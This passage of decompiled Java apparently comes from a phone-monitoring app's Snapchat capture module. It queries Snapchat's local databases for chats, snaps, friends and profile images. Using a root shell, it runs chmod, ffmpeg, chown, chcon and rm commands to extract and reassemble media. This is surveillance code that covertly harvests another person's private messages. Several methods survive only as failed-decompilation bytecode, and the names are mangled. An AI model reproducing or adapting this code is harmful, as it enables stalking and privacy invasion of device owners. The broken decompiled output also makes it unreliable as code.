  public static boolean a(String paramString1, String paramString2)
  {
    g(paramString1);
    String str;
    boolean bool;
    if (paramString2 != null)
    {
      str = d;
      bool = paramString2.equals(str);
      if (!bool) {
        bool = true;
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      str = null;
    }
  }
  
  private static String b()
  {
    Object[] arrayOfObject = new Object[4];
    arrayOfObject[0] = "SnapMessage";
    arrayOfObject[1] = "timestamp";
    arrayOfObject[2] = "timestamp";
    arrayOfObject[3] = "timestamp";
    return String.format("SELECT * FROM %s WHERE %s > ? AND %s <= ? ORDER BY %s DESC LIMIT ?", arrayOfObject);
  }
  
  public static String b(String paramString)
  {
    String str = d;
    if (str == null) {
      g(paramString);
    }
    return d;
  }
  
  private static String b(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    String str1 = null;
    Object localObject1 = ImType.SNAPCHAT;
    Object localObject3 = ImMediaFileType.ATTACHMENT;
    localObject1 = com.vvt.im.a.c.a(paramString2, (ImType)localObject1, (ImMediaFileType)localObject3);
    localObject3 = new java/io/File;
    ((File)localObject3).<init>(paramString1);
    localObject3 = ((File)localObject3).getName();
    Object localObject5 = new java/lang/StringBuilder;
    ((StringBuilder)localObject5).<init>();
    localObject1 = p.a((String)localObject1, (String)localObject3);
    localObject1 = ((StringBuilder)localObject5).append((String)localObject1);
    localObject3 = ".unzip/";
    localObject1 = ((StringBuilder)localObject1).append((String)localObject3);
    String str2 = ((StringBuilder)localObject1).toString();
    boolean bool1 = a;
    if (bool1) {}
    localObject1 = new com/vvt/io/a;
    ((com.vvt.io.a)localObject1).<init>(paramString1, str2);
    bool1 = ((com.vvt.io.a)localObject1).a();
    boolean bool2 = a;
    int j;
    Object localObject6;
    Object localObject7;
    boolean bool5;
    if ((!bool2) || (bool1))
    {
      localObject1 = new java/io/File;
      ((File)localObject1).<init>(str2);
      localObject1 = com.vvt.io.d.c((File)localObject1);
      if (localObject1 != null)
      {
        j = 0;
        localObject5 = null;
        bool2 = false;
        localObject3 = null;
        localObject6 = ((List)localObject1).iterator();
        bool1 = ((Iterator)localObject6).hasNext();
        if (bool1)
        {
          localObject1 = ((File)((Iterator)localObject6).next()).getName();
          localObject7 = "media";
          bool5 = ((String)localObject1).startsWith((String)localObject7);
          if (bool5)
          {
            Object localObject8 = localObject3;
            localObject3 = localObject1;
            localObject1 = localObject8;
          }
        }
      }
    }
    for (;;)
    {
      localObject5 = localObject3;
      localObject3 = localObject1;
      break;
      localObject7 = "overlay";
      bool5 = ((String)localObject1).startsWith((String)localObject7);
      label727:
      Object localObject4;
      label777:
      Object localObject2;
      if (bool5)
      {
        localObject3 = localObject5;
        continue;
        bool1 = a;
        if (bool1) {}
        bool1 = com.vvt.ag.b.a((String)localObject5);
        if (!bool1)
        {
          bool1 = com.vvt.ag.b.a((String)localObject3);
          if (!bool1)
          {
            bool1 = false;
            localObject1 = null;
            localObject6 = "ffmpeg";
          }
        }
        for (;;)
        {
          try
          {
            localObject6 = p.a(paramString2, (String)localObject6);
            localObject5 = p.a(str2, (String)localObject5);
            localObject3 = p.a(str2, (String)localObject3);
            localObject7 = new android/media/MediaMetadataRetriever;
            ((MediaMetadataRetriever)localObject7).<init>();
            ((MediaMetadataRetriever)localObject7).setDataSource((String)localObject5);
            int m = 19;
            str3 = ((MediaMetadataRetriever)localObject7).extractMetadata(m);
            int n = 18;
            str4 = ((MediaMetadataRetriever)localObject7).extractMetadata(n);
            ((MediaMetadataRetriever)localObject7).release();
            localObject1 = com.vvt.shell.f.b();
            if (localObject1 == null) {
              break label818;
            }
            localObject7 = "chmod 777 %s";
            i1 = 1;
          }
          catch (CannotGetRootShellException localCannotGetRootShellException)
          {
            String str3;
            String str4;
            int i1;
            Object[] arrayOfObject;
            int i2;
            int i;
            boolean bool4;
            int k;
            bool3 = b;
            if ((bool3) && (localObject1 == null)) {
              continue;
            }
            ((com.vvt.shell.f)localObject1).d();
            continue;
          }
          finally
          {
            boolean bool3 = false;
            localObject4 = null;
            localObject1 = localObject9;
            if (localObject4 != null) {
              ((com.vvt.shell.f)localObject4).d();
            }
          }
          for (;;)
          {
            try
            {
              arrayOfObject = new Object[i1];
              arrayOfObject[0] = localObject6;
              localObject7 = String.format((String)localObject7, arrayOfObject);
              ((com.vvt.shell.f)localObject1).a((String)localObject7);
              localObject7 = "%s -i %s -i  %s -filter_complex \"[1:v]scale=%s:%s[wm];[0:v][wm]overlay=0:0\" %s";
              i1 = 6;
              arrayOfObject = new Object[i1];
              arrayOfObject[0] = localObject6;
              i2 = 1;
              arrayOfObject[i2] = localObject5;
              j = 2;
              arrayOfObject[j] = localObject3;
              i = 3;
              arrayOfObject[i] = str3;
              i = 4;
              arrayOfObject[i] = str4;
              i = 5;
              arrayOfObject[i] = paramString3;
              localObject3 = String.format((String)localObject7, arrayOfObject);
              bool4 = a;
              if (bool4) {}
              ((com.vvt.shell.f)localObject1).a((String)localObject3);
              bool3 = a;
              if (bool3) {}
              localObject3 = "chown %s.%s %s";
              k = 3;
              localObject5 = new Object[k];
              i2 = 0;
              localObject6 = null;
              localObject5[0] = paramString4;
              i2 = 1;
              localObject5[i2] = paramString4;
              i2 = 2;
              localObject5[i2] = paramString3;
              localObject3 = String.format((String)localObject3, (Object[])localObject5);
              ((com.vvt.shell.f)localObject1).a((String)localObject3);
              bool3 = com.vvt.aa.a.c();
              if (bool3)
              {
                localObject3 = "chcon %s %s";
                k = 2;
                localObject5 = new Object[k];
                i2 = 0;
                localObject6 = null;
                localObject5[0] = paramString5;
                i2 = 1;
                localObject5[i2] = paramString3;
                localObject3 = String.format((String)localObject3, (Object[])localObject5);
                ((com.vvt.shell.f)localObject1).a((String)localObject3);
              }
              if (localObject1 != null) {
                ((com.vvt.shell.f)localObject1).d();
              }
              str1 = paramString3;
              localObject1 = "rm -r %s";
              bool3 = true;
            }
            finally
            {
              localObject4 = localShellException;
              localObject2 = localObject10;
              break label777;
            }
            try
            {
              localObject3 = new Object[bool3];
              k = 0;
              localObject5 = null;
              localObject3[0] = str2;
              localObject1 = String.format((String)localObject1, (Object[])localObject3);
              KMShell.a((String)localObject1);
            }
            catch (KMShell.ShellException localShellException)
            {
              bool1 = b;
              if (!bool1) {
                break label727;
              }
              break label727;
            }
          }
          bool1 = a;
          if (bool1) {}
          return str1;
          label818:
          paramString3 = null;
        }
      }
      else
      {
        localObject2 = localObject4;
        localObject4 = localObject5;
      }
    }
  }
  
  /* Error */
  private static ArrayList b(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore 6
    //   3: aconst_null
    //   4: astore 7
    //   6: new 250	java/util/ArrayList
    //   9: astore 8
    //   11: aload 8
    //   13: invokespecial 251	java/util/ArrayList:<init>	()V
    //   16: invokestatic 41	com/vvt/capture/snapchat/removeFromPath:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   19: astore 9
    //   21: iconst_1
    //   22: istore 10
    //   24: iload 10
    //   26: anewarray 44	java/lang/String
    //   29: astore 11
    //   31: aload 11
    //   33: iconst_0
    //   34: aload_2
    //   35: aastore
    //   36: aload_0
    //   37: aload 9
    //   39: aload 11
    //   41: invokevirtual 52	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   44: astore 9
    //   46: aload 9
    //   48: ifnull +43 -> 91
    //   51: aload 9
    //   53: invokeinterface 58 1 0
    //   58: istore 10
    //   60: iload 10
    //   62: ifeq +29 -> 91
    //   65: ldc 60
    //   67: astore 11
    //   69: aload 9
    //   71: aload 11
    //   73: invokeinterface 64 2 0
    //   78: istore 10
    //   80: aload 9
    //   82: iload 10
    //   84: invokeinterface 68 2 0
    //   89: astore 7
    //   91: aload 9
    //   93: ifnull +10 -> 103
    //   96: aload 9
    //   98: invokeinterface 71 1 0
    //   103: aload 7
    //   105: invokestatic 79	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   108: istore 12
    //   110: iload 12
    //   112: ifeq +6 -> 118
    //   115: aload_2
    //   116: astore 7
    //   118: aload_1
    //   119: aload_3
    //   120: aload 4
    //   122: aload 5
    //   124: aload_2
    //   125: invokestatic 799	com/vvt/capture/snapchat/removeFromPath:a	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   128: astore 9
    //   130: new 447	com/vvt/im/events/info/e
    //   133: astore 11
    //   135: aload 11
    //   137: invokespecial 800	com/vvt/im/events/info/e:<init>	()V
    //   140: aload 11
    //   142: aload_2
    //   143: invokevirtual 801	com/vvt/im/events/info/e:d	(Ljava/lang/String;)V
    //   146: aload 11
    //   148: aload 7
    //   150: invokevirtual 802	com/vvt/im/events/info/e:MyUncaughtExceptionHandler	(Ljava/lang/String;)V
    //   153: aload 11
    //   155: aload 9
    //   157: invokevirtual 803	com/vvt/im/events/info/e:a	(Ljava/lang/String;)V
    //   160: aload 8
    //   162: aload 11
    //   164: invokevirtual 306	java/util/ArrayList:add	(Ljava/lang/Object;)Z
    //   167: pop
    //   168: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   171: istore 6
    //   173: iload 6
    //   175: ifeq +3 -> 178
    //   178: aload 8
    //   180: areturn
    //   181: astore 9
    //   183: iconst_0
    //   184: istore 12
    //   186: aconst_null
    //   187: astore 9
    //   189: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   192: istore 10
    //   194: iload 10
    //   196: ifeq +3 -> 199
    //   199: aload 9
    //   201: ifnull -98 -> 103
    //   204: goto -108 -> 96
    //   207: astore 13
    //   209: iconst_0
    //   210: istore 12
    //   212: aconst_null
    //   213: astore 9
    //   215: aload 13
    //   217: astore 7
    //   219: aload 9
    //   221: ifnull +10 -> 231
    //   224: aload 9
    //   226: invokeinterface 71 1 0
    //   231: aload 7
    //   233: athrow
    //   234: astore 7
    //   236: goto -17 -> 219
    //   239: astore 11
    //   241: goto -52 -> 189
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	244	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	244	1	paramString1	String
    //   0	244	2	paramString2	String
    //   0	244	3	paramString3	String
    //   0	244	4	paramString4	String
    //   0	244	5	paramString5	String
    //   1	173	6	bool1	boolean
    //   4	228	7	localObject1	Object
    //   234	1	7	localObject2	Object
    //   9	170	8	localArrayList	ArrayList
    //   19	137	9	localObject3	Object
    //   181	1	9	localException1	Exception
    //   187	38	9	localObject4	Object
    //   22	39	10	bool2	boolean
    //   78	5	10	i	int
    //   192	3	10	bool3	boolean
    //   29	134	11	localObject5	Object
    //   239	1	11	localException2	Exception
    //   108	103	12	bool4	boolean
    //   207	9	13	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   16	19	181	java/lang/Exception
    //   24	29	181	java/lang/Exception
    //   34	36	181	java/lang/Exception
    //   39	44	181	java/lang/Exception
    //   16	19	207	finally
    //   24	29	207	finally
    //   34	36	207	finally
    //   39	44	207	finally
    //   51	58	234	finally
    //   71	78	234	finally
    //   82	89	234	finally
    //   189	192	234	finally
    //   51	58	239	java/lang/Exception
    //   71	78	239	java/lang/Exception
    //   82	89	239	java/lang/Exception
  }
  
  private static void b(String paramString1, String paramString2)
  {
    String str = d;
    boolean bool = com.vvt.ag.b.a(str);
    if (bool) {
      g(paramString2);
    }
    for (;;)
    {
      return;
      str = d;
      if (str != null)
      {
        str = d;
        bool = str.equals(paramString1);
        if (!bool) {
          g(paramString2);
        }
      }
    }
  }
  
  private static String c()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "DisplayName";
    arrayOfObject[1] = "Friends";
    arrayOfObject[2] = "Username";
    return String.format("SELECT %s FROM %s WHERE %s = ?", arrayOfObject);
  }
  
  public static boolean c(String paramString)
  {
    return h(paramString);
  }
  
  public static int d(String paramString)
  {
    return i(paramString);
  }
  
  private static String d()
  {
    Object[] arrayOfObject = new Object[3];
    arrayOfObject[0] = "path";
    arrayOfObject[1] = "ProfileImageFile";
    arrayOfObject[2] = "id";
    return String.format("SELECT %s FROM %s WHERE %s = ?", arrayOfObject);
  }
  
  /* Error */
  private static long e(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: aconst_null
    //   4: astore_3
    //   5: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   8: istore 4
    //   10: iload 4
    //   12: ifeq +3 -> 15
    //   15: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   18: istore 4
    //   20: iload 4
    //   22: ifeq +3 -> 25
    //   25: aload_0
    //   26: ifnull +189 -> 215
    //   29: aload_0
    //   30: invokestatic 520	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   33: astore 5
    //   35: ldc_w 819
    //   38: astore 6
    //   40: iconst_1
    //   41: istore 7
    //   43: iload 7
    //   45: anewarray 4	java/lang/Object
    //   48: astore 8
    //   50: aconst_null
    //   51: astore 9
    //   53: ldc_w 369
    //   56: astore 10
    //   58: aload 8
    //   60: iconst_0
    //   61: aload 10
    //   63: aastore
    //   64: aload 6
    //   66: aload 8
    //   68: invokestatic 150	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   71: astore 6
    //   73: aload 6
    //   75: invokevirtual 820	java/lang/String:toString	()Ljava/lang/String;
    //   78: astore 11
    //   80: ldc_w 761
    //   83: astore 6
    //   85: iconst_0
    //   86: istore 7
    //   88: aconst_null
    //   89: astore 8
    //   91: aconst_null
    //   92: astore 9
    //   94: aconst_null
    //   95: astore 10
    //   97: ldc_w 822
    //   100: astore 12
    //   102: aload 5
    //   104: aload 6
    //   106: aconst_null
    //   107: aconst_null
    //   108: aconst_null
    //   109: aconst_null
    //   110: aconst_null
    //   111: aload 11
    //   113: aload 12
    //   115: invokevirtual 826	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   118: astore 9
    //   120: aload 9
    //   122: ifnull +273 -> 395
    //   125: aload 9
    //   127: invokeinterface 58 1 0
    //   132: istore 13
    //   134: iload 13
    //   136: ifeq +101 -> 237
    //   139: ldc_w 369
    //   142: astore 6
    //   144: aload 9
    //   146: aload 6
    //   148: invokeinterface 64 2 0
    //   153: istore 13
    //   155: aload 9
    //   157: iload 13
    //   159: invokeinterface 373 2 0
    //   164: lstore 14
    //   166: aload 9
    //   168: ifnull +10 -> 178
    //   171: aload 9
    //   173: invokeinterface 71 1 0
    //   178: aload 5
    //   180: ifnull +8 -> 188
    //   183: aload 5
    //   185: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   188: lload 14
    //   190: lstore 16
    //   192: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   195: istore 7
    //   197: iload 7
    //   199: ifeq +3 -> 202
    //   202: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   205: istore 7
    //   207: iload 7
    //   209: ifeq +3 -> 212
    //   212: lload 16
    //   214: lreturn
    //   215: ldc_w 498
    //   218: astore 5
    //   220: ldc_w 500
    //   223: astore 6
    //   225: aload 5
    //   227: aload 6
    //   229: invokestatic 505	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   232: astore 5
    //   234: goto -199 -> 35
    //   237: lconst_0
    //   238: lstore 14
    //   240: goto -74 -> 166
    //   243: astore 5
    //   245: iconst_0
    //   246: istore 4
    //   248: aconst_null
    //   249: astore 5
    //   251: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   254: istore 13
    //   256: iload 13
    //   258: ifeq +3 -> 261
    //   261: aload 5
    //   263: ifnull +10 -> 273
    //   266: aload 5
    //   268: invokeinterface 71 1 0
    //   273: aload_3
    //   274: ifnull +7 -> 281
    //   277: aload_3
    //   278: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   281: lload_1
    //   282: lstore 16
    //   284: goto -92 -> 192
    //   287: astore 5
    //   289: iconst_0
    //   290: istore 13
    //   292: aconst_null
    //   293: astore 6
    //   295: aload_3
    //   296: ifnull +9 -> 305
    //   299: aload_3
    //   300: invokeinterface 71 1 0
    //   305: aload 6
    //   307: ifnull +8 -> 315
    //   310: aload 6
    //   312: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   315: aload 5
    //   317: athrow
    //   318: astore 18
    //   320: aload 5
    //   322: astore 6
    //   324: aload 18
    //   326: astore 5
    //   328: goto -33 -> 295
    //   331: astore 6
    //   333: aload 9
    //   335: astore_3
    //   336: aload 6
    //   338: astore 18
    //   340: aload 5
    //   342: astore 6
    //   344: aload 18
    //   346: astore 5
    //   348: goto -53 -> 295
    //   351: astore 18
    //   353: aload_3
    //   354: astore 6
    //   356: aload 5
    //   358: astore_3
    //   359: aload 18
    //   361: astore 5
    //   363: goto -68 -> 295
    //   366: astore 6
    //   368: aconst_null
    //   369: astore 18
    //   371: aload 5
    //   373: astore_3
    //   374: iconst_0
    //   375: istore 4
    //   377: aconst_null
    //   378: astore 5
    //   380: goto -129 -> 251
    //   383: astore 6
    //   385: aload 5
    //   387: astore_3
    //   388: aload 9
    //   390: astore 5
    //   392: goto -141 -> 251
    //   395: lload_1
    //   396: lstore 14
    //   398: goto -232 -> 166
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	401	0	paramString	String
    //   2	394	1	l1	long
    //   4	384	3	localObject1	Object
    //   8	368	4	bool1	boolean
    //   33	200	5	localObject2	Object
    //   243	1	5	localException1	Exception
    //   249	18	5	localObject3	Object
    //   287	34	5	localObject4	Object
    //   326	65	5	localObject5	Object
    //   38	285	6	localObject6	Object
    //   331	6	6	localObject7	Object
    //   342	13	6	localObject8	Object
    //   366	1	6	localException2	Exception
    //   383	1	6	localException3	Exception
    //   41	167	7	bool2	boolean
    //   48	42	8	arrayOfObject	Object[]
    //   51	338	9	localCursor	Cursor
    //   56	40	10	str1	String
    //   78	34	11	str2	String
    //   100	14	12	str3	String
    //   132	3	13	bool3	boolean
    //   153	5	13	i	int
    //   254	37	13	bool4	boolean
    //   164	233	14	l2	long
    //   190	93	16	l3	long
    //   318	7	18	localObject9	Object
    //   338	7	18	localObject10	Object
    //   351	9	18	localObject11	Object
    //   369	1	18	localObject12	Object
    // Exception table:
    //   from	to	target	type
    //   29	33	243	java/lang/Exception
    //   227	232	243	java/lang/Exception
    //   29	33	287	finally
    //   227	232	287	finally
    //   43	48	318	finally
    //   61	64	318	finally
    //   66	71	318	finally
    //   73	78	318	finally
    //   113	118	318	finally
    //   125	132	331	finally
    //   146	153	331	finally
    //   157	164	331	finally
    //   251	254	351	finally
    //   43	48	366	java/lang/Exception
    //   61	64	366	java/lang/Exception
    //   66	71	366	java/lang/Exception
    //   73	78	366	java/lang/Exception
    //   113	118	366	java/lang/Exception
    //   125	132	383	java/lang/Exception
    //   146	153	383	java/lang/Exception
    //   157	164	383	java/lang/Exception
  }
  
  private static String e()
  {
    Object[] arrayOfObject = new Object[7];
    arrayOfObject[0] = "timestamp";
    arrayOfObject[1] = "Chat";
    arrayOfObject[2] = "Timestamp";
    arrayOfObject[3] = "SentSnaps";
    arrayOfObject[4] = "Timestamp";
    arrayOfObject[5] = "ReceivedSnaps";
    arrayOfObject[6] = "timestamp";
    return String.format("SELECT %s FROM %s UNION SELECT %s FROM %s UNION SELECT %s FROM %s ORDER BY %s DESC LIMIT 1", arrayOfObject);
  }
  
  /* Error */
  private static long f()
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_0
    //   3: aconst_null
    //   4: astore_2
    //   5: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   8: istore_3
    //   9: iload_3
    //   10: ifeq +3 -> 13
    //   13: ldc_w 498
    //   16: astore 4
    //   18: ldc_w 500
    //   21: astore 5
    //   23: aload 4
    //   25: aload 5
    //   27: invokestatic 505	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   30: astore 4
    //   32: aload 4
    //   34: ifnull +306 -> 340
    //   37: ldc_w 838
    //   40: astore 6
    //   42: ldc_w 761
    //   45: astore 5
    //   47: iconst_0
    //   48: istore 7
    //   50: aconst_null
    //   51: astore 8
    //   53: ldc_w 822
    //   56: astore 9
    //   58: aload 4
    //   60: aload 5
    //   62: aconst_null
    //   63: aconst_null
    //   64: aconst_null
    //   65: aconst_null
    //   66: aconst_null
    //   67: aload 6
    //   69: aload 9
    //   71: invokevirtual 826	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   74: astore 5
    //   76: aload 5
    //   78: ifnull +253 -> 331
    //   81: aload 5
    //   83: invokeinterface 58 1 0
    //   88: istore 7
    //   90: iload 7
    //   92: ifeq +82 -> 174
    //   95: ldc_w 369
    //   98: astore 8
    //   100: aload 5
    //   102: aload 8
    //   104: invokeinterface 64 2 0
    //   109: istore 7
    //   111: aload 5
    //   113: iload 7
    //   115: invokeinterface 373 2 0
    //   120: lstore_0
    //   121: aload 5
    //   123: astore_2
    //   124: lload_0
    //   125: lstore 10
    //   127: aload_2
    //   128: ifnull +9 -> 137
    //   131: aload_2
    //   132: invokeinterface 71 1 0
    //   137: aload 4
    //   139: ifnull +8 -> 147
    //   142: aload 4
    //   144: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   147: lload 10
    //   149: lstore 12
    //   151: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   154: istore 7
    //   156: iload 7
    //   158: ifeq +3 -> 161
    //   161: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   164: istore 7
    //   166: iload 7
    //   168: ifeq +3 -> 171
    //   171: lload 12
    //   173: lreturn
    //   174: lconst_0
    //   175: lstore_0
    //   176: aload 5
    //   178: astore_2
    //   179: lload_0
    //   180: lstore 10
    //   182: goto -55 -> 127
    //   185: astore 4
    //   187: iconst_0
    //   188: istore_3
    //   189: aconst_null
    //   190: astore 4
    //   192: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   195: istore 14
    //   197: iload 14
    //   199: ifeq +3 -> 202
    //   202: aload 4
    //   204: ifnull +10 -> 214
    //   207: aload 4
    //   209: invokeinterface 71 1 0
    //   214: aload_2
    //   215: ifnull +7 -> 222
    //   218: aload_2
    //   219: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   222: lload_0
    //   223: lstore 12
    //   225: goto -74 -> 151
    //   228: astore 4
    //   230: iconst_0
    //   231: istore 14
    //   233: aconst_null
    //   234: astore 5
    //   236: aload_2
    //   237: ifnull +9 -> 246
    //   240: aload_2
    //   241: invokeinterface 71 1 0
    //   246: aload 5
    //   248: ifnull +8 -> 256
    //   251: aload 5
    //   253: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   256: aload 4
    //   258: athrow
    //   259: astore 15
    //   261: aload 4
    //   263: astore 5
    //   265: aload 15
    //   267: astore 4
    //   269: goto -33 -> 236
    //   272: astore 8
    //   274: aload 5
    //   276: astore_2
    //   277: aload 4
    //   279: astore 5
    //   281: aload 8
    //   283: astore 4
    //   285: goto -49 -> 236
    //   288: astore 15
    //   290: aload_2
    //   291: astore 5
    //   293: aload 4
    //   295: astore_2
    //   296: aload 15
    //   298: astore 4
    //   300: goto -64 -> 236
    //   303: astore 5
    //   305: aconst_null
    //   306: astore 15
    //   308: aload 4
    //   310: astore_2
    //   311: iconst_0
    //   312: istore_3
    //   313: aconst_null
    //   314: astore 4
    //   316: goto -124 -> 192
    //   319: astore 8
    //   321: aload 4
    //   323: astore_2
    //   324: aload 5
    //   326: astore 4
    //   328: goto -136 -> 192
    //   331: aload 5
    //   333: astore_2
    //   334: lload_0
    //   335: lstore 10
    //   337: goto -210 -> 127
    //   340: lload_0
    //   341: lstore 10
    //   343: goto -216 -> 127
    // Local variable table:
    //   start	length	slot	name	signature
    //   2	339	0	l1	long
    //   4	330	2	localObject1	Object
    //   8	305	3	bool1	boolean
    //   16	127	4	localObject2	Object
    //   185	1	4	localException1	Exception
    //   190	18	4	localObject3	Object
    //   228	34	4	localObject4	Object
    //   267	60	4	localObject5	Object
    //   21	271	5	localObject6	Object
    //   303	29	5	localException2	Exception
    //   40	28	6	str1	String
    //   48	43	7	bool2	boolean
    //   109	5	7	i	int
    //   154	13	7	bool3	boolean
    //   51	52	8	str2	String
    //   272	10	8	localObject7	Object
    //   319	1	8	localException3	Exception
    //   56	14	9	str3	String
    //   125	217	10	l2	long
    //   149	75	12	l3	long
    //   195	37	14	bool4	boolean
    //   259	7	15	localObject8	Object
    //   288	9	15	localObject9	Object
    //   306	1	15	localObject10	Object
    // Exception table:
    //   from	to	target	type
    //   25	30	185	java/lang/Exception
    //   25	30	228	finally
    //   69	74	259	finally
    //   81	88	272	finally
    //   102	109	272	finally
    //   113	120	272	finally
    //   192	195	288	finally
    //   69	74	303	java/lang/Exception
    //   81	88	319	java/lang/Exception
    //   102	109	319	java/lang/Exception
    //   113	120	319	java/lang/Exception
  }
  
  /* Error */
  private static long f(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: iconst_0
    //   4: istore_3
    //   5: aconst_null
    //   6: astore 4
    //   8: aload_0
    //   9: ifnull +106 -> 115
    //   12: aload_0
    //   13: invokestatic 520	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:MyUncaughtExceptionHandler	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   16: astore 5
    //   18: aload 5
    //   20: ifnull +63 -> 83
    //   23: invokestatic 839	com/vvt/capture/snapchat/removeFromPath:e	()Ljava/lang/String;
    //   26: astore 6
    //   28: aload 5
    //   30: aload 6
    //   32: aconst_null
    //   33: invokevirtual 52	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   36: astore 4
    //   38: aload 4
    //   40: ifnull +43 -> 83
    //   43: aload 4
    //   45: invokeinterface 58 1 0
    //   50: istore 7
    //   52: iload 7
    //   54: ifeq +83 -> 137
    //   57: ldc_w 369
    //   60: astore 6
    //   62: aload 4
    //   64: aload 6
    //   66: invokeinterface 64 2 0
    //   71: istore 7
    //   73: aload 4
    //   75: iload 7
    //   77: invokeinterface 373 2 0
    //   82: lstore_1
    //   83: aload 4
    //   85: ifnull +10 -> 95
    //   88: aload 4
    //   90: invokeinterface 71 1 0
    //   95: aload 5
    //   97: ifnull +8 -> 105
    //   100: aload 5
    //   102: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   105: getstatic 15	com/vvt/capture/snapchat/removeFromPath:a	Z
    //   108: istore_3
    //   109: iload_3
    //   110: ifeq +3 -> 113
    //   113: lload_1
    //   114: lreturn
    //   115: ldc_w 498
    //   118: astore 5
    //   120: ldc_w 500
    //   123: astore 6
    //   125: aload 5
    //   127: aload 6
    //   129: invokestatic 505	com/vvt/capture/snapchat/MyUncaughtExceptionHandler:a	(Ljava/lang/String;Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   132: astore 5
    //   134: goto -116 -> 18
    //   137: lconst_0
    //   138: lstore_1
    //   139: goto -56 -> 83
    //   142: astore 5
    //   144: aconst_null
    //   145: astore 5
    //   147: getstatic 20	com/vvt/capture/snapchat/removeFromPath:removeFromPath	Z
    //   150: istore 7
    //   152: iload 7
    //   154: ifeq +3 -> 157
    //   157: aload 4
    //   159: ifnull +10 -> 169
    //   162: aload 4
    //   164: invokeinterface 71 1 0
    //   169: aload 5
    //   171: ifnull -66 -> 105
    //   174: goto -74 -> 100
    //   177: astore 8
    //   179: aconst_null
    //   180: astore 5
    //   182: aload 4
    //   184: ifnull +10 -> 194
    //   187: aload 4
    //   189: invokeinterface 71 1 0
    //   194: aload 5
    //   196: ifnull +8 -> 204
    //   199: aload 5
    //   201: invokevirtual 517	android/database/sqlite/SQLiteDatabase:close	()V
    //   204: aload 8
    //   206: athrow
    //   207: astore 8
    //   209: goto -27 -> 182
    //   212: astore 6
    //   214: goto -67 -> 147
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	217	0	paramString	String
    //   2	137	1	l	long
    //   4	106	3	bool1	boolean
    //   6	182	4	localCursor	Cursor
    //   16	117	5	localObject1	Object
    //   142	1	5	localException1	Exception
    //   145	55	5	localObject2	Object
    //   26	102	6	str	String
    //   212	1	6	localException2	Exception
    //   50	3	7	bool2	boolean
    //   71	5	7	i	int
    //   150	3	7	bool3	boolean
    //   177	28	8	localObject3	Object
    //   207	1	8	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   12	16	142	java/lang/Exception
    //   127	132	142	java/lang/Exception
    //   12	16	177	finally
    //   127	132	177	finally
    //   23	26	207	finally
    //   32	36	207	finally
    //   43	50	207	finally
    //   64	71	207	finally
    //   75	82	207	finally
    //   147	150	207	finally
    //   23	26	212	java/lang/Exception
    //   32	36	212	java/lang/Exception
    //   43	50	212	java/lang/Exception
    //   64	71	212	java/lang/Exception
    //   75	82	212	java/lang/Exception
  }
  
  /* Error */
  private static void g(String paramString)
